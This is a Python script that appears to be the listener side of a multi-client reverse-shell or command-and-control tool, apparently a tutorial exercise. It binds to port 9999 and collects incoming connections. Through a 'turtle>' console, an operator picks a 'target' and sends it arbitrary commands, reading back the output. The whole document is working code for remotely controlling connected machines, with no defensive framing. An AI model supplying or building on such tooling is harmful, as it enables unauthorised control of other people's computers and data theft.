import socket  
import sys
import threading
from queue import Queue



NUMBER_OF_THREADS = 2
JOB_NUMBER= [1,2]
queue = Queue()
all_connections = []
all_addresses = []




def socket_create():
    try:
        global host
        global port 
        global s  
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('socket creation error' + str(msg))



# binding s0cket to port and wait for getting connection from client
def socket_bind():
    try: 
        global host
        global port 
        global s 
        print(f"binding socket to port {str(port)}")
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print('socket binding error:' + str(msg) + "\n" + "retrying")
        socket_bind()


# establish a connection with client  ...this can happen only when socket is listening for connections 
# def socket_accept():
#         print("waiting for connections")
#         conn, address = s.accept()
#         print("connection has been established |" + "ip" + address[0] + "| port" + str(address[1]))
#         send_commands(conn)
#         conn.close()


#accept connections from multiple clients and save to list 
def accept_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n connection has been established:" + address[0])
            
        except:
            print("eerror accepting connections")





#interactive prompt for sending commands remotely 
#this one itself runs on it's own thread 
def start_turtle():
    while True: 
        cmd = input('turtle>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                print(conn)
                send_target_commands(conn)
        else:
            print("command not recognised")



#displaying all current connections 
def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try: 
            conn.send(str.encode('  '))
            conn.recv(20480)

        except:
            print('in except')
            del all_connections[i]
            del all_addresses[i]
            print('waste')
            continue
        results += str(i) + ' ' + str(all_addresses[i][0]) + ' '+ str(all_addresses[i][1]) + '\n'

    print('------clients--------' + '\n' + results)






def get_target(cmd):
    # try:

        target = cmd.replace('select', '')
        
        target = int(target)
        conn = all_connections[target]
        print("you are now cnonnected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '>', end="")
        return conn
    # except:
    #     print('not a valid selection')
    #     return None



#connect with remote target client

def send_target_commands(conn):
    while True:
        # try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                full_response = ""
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    chunk_decoded = chunk.decode("utf-8")
                    full_response += chunk_decoded
                    if len(chunk) < 4096:
                        break
                
                print(full_response, end="")
            if cmd == 'quit':
                break
        # except:
        #     print("connection was lost")
        #     break



def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(10240),"utf-8")
            #next we need to add buffering here 
            print(client_response, end="")

          

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon= True 
        t.start()




def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x ==2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    print('main')





create_workers()
create_jobs()




    